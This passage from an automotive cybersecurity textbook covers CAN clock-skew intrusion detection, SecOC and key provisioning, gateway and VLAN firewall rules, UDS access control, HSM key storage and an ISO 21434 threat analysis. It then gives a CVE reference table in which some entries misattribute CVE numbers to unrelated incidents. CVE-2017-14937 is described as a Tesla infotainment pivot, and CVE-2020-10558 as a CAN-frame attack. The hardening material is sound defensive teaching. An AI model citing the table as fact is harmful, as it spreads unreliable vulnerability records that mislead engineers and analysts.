**Fingerprint extraction.** Collect N consecutive timestamps for a given arbitration ID: {t₁, t₂, ..., tₙ}. Compute the inter-arrival times: Δtₖ = tₖ₊₁ - tₖ. The expected period is T (e.g., 10 ms for engine RPM). The cumulative clock offset: Oₖ = Σᵢ₌₁ᵏ (Δtᵢ - T). A linear regression on Oₖ yields the clock skew (slope of the regression line) in ppm. This skew is a hardware-specific fingerprint.

**Injection detection.** When an attacker injects frames with the same arbitration ID, the injected frames have a different clock skew (the attacker's oscillator differs from the legitimate ECU). The observed clock-offset sequence shows a discontinuity at injection points. A sliding-window skew estimator detects the skew change and flags the injection.

**Limitations.** Requires sufficient baseline data (hundreds of frames per ID). Does not work for event-triggered messages (non-periodic). Temperature changes affect crystal oscillator frequency, causing slow skew drift that must be tracked. An attacker aware of this defense can synchronize their injection timing to the legitimate ECU's clock (by monitoring and phase-locking), but this requires hardware sophistication that raises the attack bar significantly.

---

## 11E. Vehicle Network Hardening

### 11E.1 SecOC deployment

**AUTOSAR configuration.** SecOC deployment involves configuring the following AUTOSAR modules:

- **SecOC module configuration (SecOCGeneral).** Enable SecOC for selected PDU groups. Configure per-PDU: `SecOCFreshnessValueTruncLength` (bits of freshness value transmitted, typically 8-32), `SecOCAuthInfoTruncLength` (bits of truncated MAC transmitted, 24-64), `SecOCAuthenticationBuildAttempts` (retry count on MAC computation failure), `SecOCAuthenticationVerifyAttempts` (retry count on verification failure).

- **Freshness Value Manager (FvM).** Configure the freshness strategy: counter-based or time-based. For counter-based: set `FvMFreshnessValueLength` (total freshness value length in bits, typically 64), `FvMTripResetSyncRange` (acceptance window size), and the synchronization PDU ID. The synchronization PDU broadcasts the current trip counter and reset counter at a configurable period (e.g., every 1 second).

- **Crypto Service Manager (CSM).** Configure the CMAC job: algorithm (AES-128-CMAC), key reference (pointing to the HSM key slot), and MAC length (128 bits before truncation). The CSM dispatches CMAC operations to the hardware crypto driver (Cry) if an HSM is present, or to a software crypto library otherwise.

**Key distribution.** Keys are provisioned at manufacturing via a secure diagnostic session: the production tester (connected via DoIP or CAN) authenticates to the ECU using a factory-level SecurityAccess, then writes the SecOC key to the HSM key slot via WriteDataByIdentifier (DID assigned to the SecOC key). The key is encrypted in transit using a transport key derived from the ECU's unique identity and the OEM's key management HSM. Post-manufacturing key rotation uses the same UDS-based update path, triggered during dealer service visits or via OTA update.

**MAC truncation trade-offs.** The truncation length directly determines the forgery resistance and the CAN bandwidth overhead:

| MAC Bits | Forgery Attempts (avg) | Time at 4000 fps | CAN Bytes Used | Recommendation |
|----------|----------------------|-------------------|----------------|----------------|
| 24       | 2²³ ≈ 8.4M          | ~35 minutes       | 3              | Body-domain only |
| 28       | 2²⁷ ≈ 134M          | ~9.3 hours        | 3.5 (4 with FV)| Minimum for safety |
| 32       | 2³¹ ≈ 2.1B          | ~6.2 days         | 4              | Powertrain/chassis |
| 48       | 2⁴⁷ ≈ 140T          | ~1100 years       | 6              | CAN FD only |
| 64       | 2⁶³                 | infeasible        | 8              | CAN FD / Ethernet |

### 11E.2 CAN bus network segmentation

Gateway firewall rules enforce domain isolation. The gateway ECU maintains a per-bus forwarding table that specifies which arbitration IDs may be forwarded between bus segments, in which direction, and under what conditions.

```
# Gateway firewall rule examples (pseudocode)

# RULE 1: Powertrain → Body: allow only vehicle speed for instrument cluster
ALLOW  powertrain → body  ID=0x0B4  # VehicleSpeed
DENY   powertrain → body  ID=*      # Block all other powertrain IDs

# RULE 2: Diagnostic → Powertrain: allow UDS only during active session
ALLOW  diagnostic → powertrain  ID=0x7E0-0x7EF  IF diagnostic_session=active
DENY   diagnostic → powertrain  ID=0x7E0-0x7EF  IF diagnostic_session=inactive
DENY   diagnostic → powertrain  ID=*             # No non-diagnostic forwarding

# RULE 3: Infotainment → Powertrain: DENY ALL (no path from IVI to engine)
DENY   infotainment → powertrain  ID=*

# RULE 4: Body → Infotainment: allow only media control
ALLOW  body → infotainment  ID=0x290  # SteeringWheelButtons
DENY   body → infotainment  ID=*

# RULE 5: Rate limiting on diagnostic bus
RATE_LIMIT  diagnostic → *  ID=0x7DF  max_rate=10/s  # OBD broadcast
RATE_LIMIT  diagnostic → *  ID=0x7E0  max_rate=50/s  # Single-ECU diag
```

### 11E.3 UDS service access control matrix

Not all UDS services should be available in all sessions or to all testers. The access control matrix defines which services are permitted under which conditions:

| Service (SID) | Default Session | Extended Session | Programming Session | Requires SecurityAccess | Requires Auth (0x29) |
|---------------|:-:|:-:|:-:|:-:|:-:|
| ReadDataByIdentifier (0x22) | Yes | Yes | Yes | No | No |
| ReadMemoryByAddress (0x23) | No | No | Yes | Level 0x03 | Recommended |
| SecurityAccess (0x27) | No | Yes | Yes | N/A | N/A |
| WriteDataByIdentifier (0x2E) | No | Yes | Yes | Level 0x01 | Recommended |
| RoutineControl (0x31) | No | Yes | Yes | Level 0x01 | Recommended |
| RequestDownload (0x34) | No | No | Yes | Level 0x03 | Required |
| WriteMemoryByAddress (0x3D) | No | No | Yes | Level 0x03 | Required |
| InputOutputControl (0x2F) | No | Yes | No | Level 0x01 | Recommended |
| ECUReset (0x11) | No | Yes | Yes | Level 0x01 | Recommended |

Implementation: each ECU enforces this matrix in its UDS service dispatcher. Services requested outside their permitted context return NRC 0x33 (securityAccessDenied) or NRC 0x22 (conditionsNotCorrect). The matrix is defined per ECU in the OEM's diagnostic specification and verified during type-approval testing.

### 11E.4 Automotive Ethernet microsegmentation

Beyond VLAN-based domain separation, automotive Ethernet hardening includes per-stream filtering and firewall rules at each switch port.

**VLAN + firewall per domain.** Each functional domain (ADAS, infotainment, body, powertrain, diagnostics) is assigned a VLAN. Inter-VLAN traffic is routed only through the central gateway/domain controller, which applies application-layer firewall rules:

```
# Automotive Ethernet firewall rules (central gateway)

# ADAS VLAN (10) — high-integrity, restricted access
ALLOW  VLAN 10 ↔ VLAN 10   # Intra-ADAS (cameras, sensor fusion, ADAS ECU)
DENY   VLAN 20 → VLAN 10   # Infotainment cannot reach ADAS
DENY   VLAN 30 → VLAN 10   # Diagnostics cannot reach ADAS directly
ALLOW  VLAN 40 → VLAN 10   proto=SOME/IP service=0x2000  # Gateway-mediated
                            # vehicle-speed feed to ADAS (read-only)

# Infotainment VLAN (20) — untrusted
ALLOW  VLAN 20 ↔ VLAN 20
ALLOW  VLAN 20 → gateway    proto=SOME/IP service=0x3000  # Media control
DENY   VLAN 20 → VLAN 10|30|40  # No direct cross-domain access

# Diagnostics VLAN (30) — controlled access
ALLOW  VLAN 30 → any  proto=DoIP  IF routing_activated AND tls_authenticated
DENY   VLAN 30 → any  proto=DoIP  IF NOT tls_authenticated
```

**Per-Stream Filtering and Policing (IEEE 802.1Qci — PSFP).** At each switch ingress port, PSFP enforces per-stream constraints: maximum frame rate, maximum frame size, and arrival time window (for TSN time-aware streams). Frames violating any constraint are dropped at the switch, preventing a compromised ECU from flooding the network or injecting out-of-schedule traffic.

### 11E.5 HSM integration for key storage

**SHE (Secure Hardware Extension, HIS Standard).** The baseline automotive HSM, widely deployed in AUTOSAR Classic Platform ECUs. SHE provides: 10 user key slots (128-bit AES), secure boot (verified against a stored hash), CMAC computation in hardware, monotonic counter (for anti-rollback), random number generation. Keys are loaded via the Miyaguchi-Preneel key-update protocol — each key update requires the previous key as authorization, preventing unauthorized key replacement. SHE does not support asymmetric cryptography — it is limited to AES-128 operations.

**EVITA (E-safety Vehicle Intrusion Protected Applications).** Defines three HSM profiles:

- **EVITA Light.** AES-128, SHA-256, CMAC. Equivalent to SHE with additional hash support. Suitable for body-domain ECUs.
- **EVITA Medium.** Adds RSA-2048 and ECDSA-256. Suitable for domain controllers that need firmware signature verification.
- **EVITA Full.** Adds secure key agreement (ECDH), TLS acceleration, and large key storage (50+ key slots). Suitable for central compute units (ADAS domain controller, central gateway) that terminate TLS/DTLS sessions.

**HSM Lite (AUTOSAR Crypto Stack with software HSM).** For cost-constrained ECUs that cannot afford a hardware HSM IC, AUTOSAR supports a software-based crypto module running in a trusted execution environment (TEE) on the MCU. The TEE provides memory isolation between the crypto module and the application software. This is less secure than a hardware HSM (no side-channel resistance, no tamper detection) but provides key isolation at lower cost. Appropriate for low-criticality body-domain ECUs where the threat model does not include physical-access side-channel attacks.

**Key storage hierarchy.**

```
HSM Key Slots
├── Slot 0: Master ECU Key (MEK) — never leaves HSM, used to derive others
├── Slot 1: SecOC Group Key (powertrain domain)
├── Slot 2: SecOC Group Key (chassis domain)
├── Slot 3: SecOC Group Key (body domain)
├── Slot 4: UDS SecurityAccess Key (level 0x01)
├── Slot 5: UDS SecurityAccess Key (level 0x03)
├── Slot 6: Secure Boot Verification Key (ECDSA public key hash)
├── Slot 7: OTA Update Signing Key (ECDSA public key)
├── Slot 8: TLS Pre-Shared Key (for DoIP/SOME/IP)
├── Slot 9: Transport Key (for secure key provisioning)
└── Counter: Monotonic counter (anti-rollback for firmware version)
```

### 11E.6 TARA per ISO 21434

The TARA process, as described in §9.4, must be applied to every in-vehicle network component. A practical TARA for CAN bus security produces the following artifact chain:

**Asset catalog (CAN bus example).**

| Asset | Cybersecurity Property | Damage Scenario |
|-------|----------------------|-----------------|
| Powertrain CAN bus integrity | Authenticity | False torque request → unintended acceleration |
| Vehicle speed signal (ID 0x0B4) | Integrity | Manipulated speedometer → wrong speed display |
| UDS diagnostic access | Access control | Unauthorized firmware modification |
| ECU firmware | Integrity | Malicious firmware → arbitrary actuator control |
| SecOC keys | Confidentiality | Key extraction → bypass all CAN authentication |

**Threat scenario → mitigation mapping.**

| Threat | Impact | Feasibility | Risk | Mitigation |
|--------|--------|-------------|------|------------|
| CAN injection via OBD-II | S3 (safety) | High | Unacceptable | SecOC + CAN IDS + gateway filtering |
| Priority DoS (ID 0x000 flood) | S2 (safety) | High | Unacceptable | IDS detection + bus guardian |
| Bus-off attack on ABS ECU | S3 (safety) | Medium | Unacceptable | Error-counter monitoring + bus guardian IC |
| UDS SecurityAccess brute-force | S2 (safety) | High | Unacceptable | Strong key algorithm + attempt limiting + Auth (0x29) |
| SecOC key extraction via SCA | S3 (safety) | Low | Tolerable | HSM with CC EAL4+ AVA_VAN.4 |
| DoIP unauthenticated access | S2 (safety) | High | Unacceptable | TLS mutual auth (ISO 13400-3) |
| SOME/IP-SD spoofing | S2 (safety) | Medium | Unacceptable | TLS/DTLS + IAM + PSFP |

Each mitigation is tracked as a cybersecurity requirement through the ISO 21434 development phase, verified through penetration testing at the integration level, and the verification evidence is submitted for UN R155 type approval.

---

## 11F. CVE Reference Table

The following CVEs document publicly-disclosed vulnerabilities in vehicle network protocols and their exploitation. Each entry includes the affected system, attack vector, root cause, and the network-layer mechanism from this chapter that the exploit leverages.

| CVE | Year | Target | Attack Vector | Root Cause | Chapter Reference | CVSS 3.1 |
|-----|------|--------|--------------|------------|-------------------|-----------|
| CVE-2015-5611 | 2015 | Jeep Cherokee (Uconnect) | Cellular → CAN injection | D-Bus service exposed on cellular interface; no gateway filtering between IVI and powertrain CAN | §4.3 injection, §6.4 DoIP (IP-based access) | 9.8 Critical |
| CVE-2016-6259 | 2016 | VW Group (MQB platform) | Physical CAN access | UDS SecurityAccess used XOR-based key derivation with static mask; 16-bit effective key space | §7.3 SecurityAccess exploitation | 6.8 Medium |
| CVE-2017-14937 | 2017 | Tesla Model S/X (Parrot module) | Wi-Fi → Ethernet → CAN | Infotainment Linux kernel vulnerability allowing pivot from Ethernet to CAN gateway | §6.2 VLAN segmentation, §4.3 injection | 8.1 High |
| CVE-2018-9322 | 2018 | BMW ConnectedDrive | Cellular → telematics | Missing TLS certificate validation in telematics unit allowed MitM and diagnostic command injection | §6.4 DoIP, §6.5 SOME/IP | 8.8 High |
| CVE-2019-9493 | 2019 | Hyundai Blue Link | Mobile app → telematics | Hardcoded credentials in companion app allowed remote vehicle control via telematics API | §6.4 DoIP (remote diagnostic access) | 9.1 Critical |
| CVE-2020-10558 | 2020 | Tesla Model 3 | CAN injection via service port | Malformed CAN frame on diagnostic CAN triggered instrument cluster reboot; no input validation on DLC/data | §4.3 injection, §4.6 CAN IDS | 6.5 Medium |
| CVE-2020-15912 | 2020 | Tesla Model X | BLE → key fob → CAN | Key fob firmware update mechanism lacked code signing; modified firmware enabled relay attack into CAN | §8 SecOC (missing authentication) | 6.5 Medium |
| CVE-2021-22156 | 2021 | BlackBerry QNX (SDP, QNX OS) | Network → ECU | Integer overflow in QNX calloc() — affected ADAS domain controllers running QNX; remote code execution via crafted packet | §6.6 AUTOSAR Adaptive (QNX-based) | 9.8 Critical |
| CVE-2022-26269 | 2022 | Suzuki (multiple models) | Physical CAN (OBD-II) | No gateway filtering between OBD-II diagnostic bus and powertrain CAN; UDS commands forwarded without restriction | §7.1 UDS services, §11E.2 segmentation | 6.1 Medium |
| CVE-2022-44458 | 2022 | Hyundai/Kia (various 2015-2022) | Physical CAN (steering column) | Immobilizer bypass via CAN injection; missing SecOC on immobilizer PDUs allowed direct engine-start command injection | §4.3 injection, §8 SecOC (absent) | 6.8 Medium |
| CVE-2023-29389 | 2023 | Toyota RAV4 | Physical CAN (headlight connector) | CAN injection via externally-accessible headlight bus wiring; no bus segmentation between lighting and chassis CAN | §4.3 injection, §11E.2 segmentation | 6.8 Medium |
| CVE-2023-33075 | 2023 | Qualcomm SA8155P (automotive SoC) | Network → IVI → CAN | Memory corruption in Snapdragon Auto IVI chipset; exploitable via crafted multimedia file or network packet; pivot to CAN via compromised IVI | §6.6 AUTOSAR Adaptive, §4.3 injection | 9.8 Critical |

**Patterns across CVEs.**

Three root causes dominate: (1) **missing or weak CAN authentication** — CVE-2020-10558, CVE-2022-44458, CVE-2023-29389 all exploit the fundamental lack of source authentication on CAN, which SecOC (§8) addresses; (2) **insufficient gateway segmentation** — CVE-2015-5611, CVE-2022-26269, CVE-2023-29389 show that flat CAN architectures without gateway filtering allow trivial lateral movement from low-value buses (diagnostic, body, lighting) to safety-critical buses (powertrain, chassis); (3) **weak UDS SecurityAccess implementations** — CVE-2016-6259 demonstrates that XOR-based seed-key algorithms with small key spaces provide negligible protection, necessitating the transition to UDS Authentication (0x29, §7.6) with PKI-based mutual authentication.

**Trend 2020-2025.** Post-R155 vehicles (2022+) show a shift toward remote attack vectors (cellular, Wi-Fi, BLE) targeting the software stack (Linux/QNX IVI, telematics middleware) rather than direct CAN injection. The CAN-level exploits in these attack chains are secondary — the primary vulnerability is in the IP-facing attack surface. This validates the defense-in-depth approach: even with SecOC and CAN IDS deployed, the Ethernet/IP layer must be hardened with TLS, IAM, and PSFP to prevent remote attackers from reaching the CAN bus in the first place.

---

## 12. Cross-references

**To Domain 9 (network):** Automotive Ethernet (§6) brings TCP/IP-based attacks (Chapter 9A) into the vehicle. MACsec (Chapter 9B §1.5) and TLS (Chapter 9A §3) are the encryption mechanisms deployed on Automotive Ethernet. DoIP (§6.4) is UDS over TCP/IP — subject to the same ARP/DNS/injection attacks as any IP service. The TSN time-synchronization attack (§6.3) connects to NTP/PTP attacks covered in Chapter 9A.

**To Domain 12 (RE):** ECU firmware RE (Chapter 12B) is the prerequisite for reversing UDS SecurityAccess algorithms (§7.3) and CAN message encoding (§3). Automotive MCUs (Infineon TriCore, NXP S32K, Renesas RH850, STM32) use architectures supported by Ghidra and IDA. JTAG/SWD (Chapter 12B §2.2) provides hardware debug access to ECUs. The `ReadMemoryByAddress` UDS exploitation (§7.5) is an alternative firmware extraction method when JTAG is disabled.

**To Chapter 21B:** The network-level understanding from this chapter enables the vehicle-level attacks in Chapter 21B (gateway bypass, infotainment compromise, OTA attacks). SecOC (§8) is the defense against the CAN injection attacks described in §4. The UDS exploitation chain (§7) is the mechanism for ECU firmware modification that Chapter 21B's OTA security aims to prevent. The SOME/IP service-spoofing attack (§6.5) is the Automotive Ethernet equivalent of the CAN injection attacks — targeting the service layer rather than the frame layer.

**To Domain 18 (hardware):** ECU HSMs (§8.5) and side-channel attacks on key extraction (§8.7) connect to the hardware security concepts in Domain 18. The physical CAN bus access (§1) is a hardware-layer prerequisite for all CAN attacks. CAN bus guardian ICs (§4.5) are hardware-level defenses that complement the software-based IDS (§4.6).

**To Domain 3 (cryptography):** SecOC's CMAC-AES-128 (§8.2) and MAC truncation analysis (§8.4) connect to symmetric authentication concepts in Chapter 3B. The UDS Authentication service's PKI-based approach (§7.6) connects to certificate management and X.509 in Chapter 3A. The side-channel attacks on SecOC key extraction (§8.7) connect to implementation attacks on AES in Chapter 3C. The MAC brute-force feasibility calculations (§8.4) depend on the birthday-bound and collision-resistance properties discussed in Chapter 3B.
